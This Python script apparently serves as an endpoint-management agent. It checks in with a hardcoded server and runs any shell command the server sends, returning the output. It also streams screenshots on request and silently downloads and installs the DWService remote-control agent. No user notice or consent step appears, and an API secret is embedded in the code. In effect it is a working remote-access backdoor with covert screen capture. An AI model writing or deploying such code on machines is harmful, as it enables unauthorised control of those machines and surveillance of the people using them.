import requests
import platform
import subprocess
import time
import os
import psutil
import pyautogui
import base64
import threading
from io import BytesIO
from PIL import Image

# ================= CONFIGURATION =================
SERVER_URL = "https://uem-ten.vercel.app"
API_SECRET_KEY = "7f9c2e4b8a1d5f306e92b8d4c1a7e5f93b0a2d6c4e8f1b9a7d3c5e0b2f4a6d8c"
DWS_KEY = "512-420-218"  # Replace with your actual 10-digit code
# =================================================

remote_view_active = False


def get_serial():
    try:
        if platform.system() == "Windows":
            return subprocess.check_output("powershell (Get-CimInstance -ClassName Win32_BIOS).SerialNumber",
                                           shell=True).decode().strip()
        return subprocess.check_output("ioreg -l | grep IOPlatformSerialNumber", shell=True).decode().split('"')[-2]
    except:
        return f"ID-{platform.node()}"


def capture_screen_base64():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.thumbnail((800, 800), Image.Resampling.LANCZOS)
        buffer = BytesIO()
        screenshot.save(buffer, format="JPEG", quality=30)
        return base64.b64encode(buffer.getvalue()).decode('utf-8')
    except:
        return None


def remote_view_loop(serial):
    global remote_view_active
    print("Screen View Started...")
    for _ in range(120):  # Run for ~4 minutes
        if not remote_view_active: break
        img = capture_screen_base64()
        if img:
            try:
                requests.post(f"{SERVER_URL}/screen-upload", json={"id": serial, "image": img},
                              headers={"X-API-KEY": API_SECRET_KEY}, timeout=5)
            except:
                pass
        time.sleep(2)
    remote_view_active = False


def install_dwservice():
    system = platform.system()
    try:
        if system == "Windows":
            url = "https://www.dwservice.net/download/dwagent_x86.exe"
            path = os.path.join(os.environ["TEMP"], "dwagent_setup.exe")
            r = requests.get(url)
            with open(path, "wb") as f: f.write(r.content)
            res = subprocess.run(f'"{path}" -silent -key={DWS_KEY}', shell=True, capture_output=True)
            return "DWService Install Initiated" if res.returncode == 0 else f"Error: {res.stderr}"
        return "OS Not Supported yet"
    except Exception as e:
        return str(e)


def execute_task(serial, command):
    global remote_view_active

    if command == "SCREEN_ON":
        if not remote_view_active:
            remote_view_active = True
            threading.Thread(target=remote_view_loop, args=(serial,), daemon=True).start()
        return "Live View Activated"

    if command == "SCREEN_OFF":
        remote_view_active = False
        return "Live View Deactivated"

    if command == "INSTALL_REMOTE":
        return install_dwservice()

    try:
        process = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = (process.stdout + process.stderr) or "Command executed."
        status = "success" if process.returncode == 0 else "failed"
    except Exception as e:
        output, status = str(e), "failed"

    requests.post(f"{SERVER_URL}/report-result", json={"id": serial, "output": output, "status": status},
                  headers={"X-API-KEY": API_SECRET_KEY})


def main():
    serial = get_serial()
    while True:
        try:
            payload = {
                "id": serial, "hostname": platform.node(),
                "platform": platform.system(),
                "cpu_usage": int(psutil.cpu_percent()),
                "ram_usage": int(psutil.virtual_memory().percent),
                "disk_usage": int(psutil.disk_usage('/').percent),
                "battery_level": int(psutil.sensors_battery().percent) if psutil.sensors_battery() else 100
            }
            r = requests.post(f"{SERVER_URL}/checkin", json=payload, headers={"X-API-KEY": API_SECRET_KEY}, timeout=10)
            if r.status_code == 200:
                cmd = r.json().get("command")
                if cmd: threading.Thread(target=execute_task, args=(serial, cmd), daemon=True).start()
        except:
            pass
        time.sleep(30)


if __name__ == "__main__":
    main()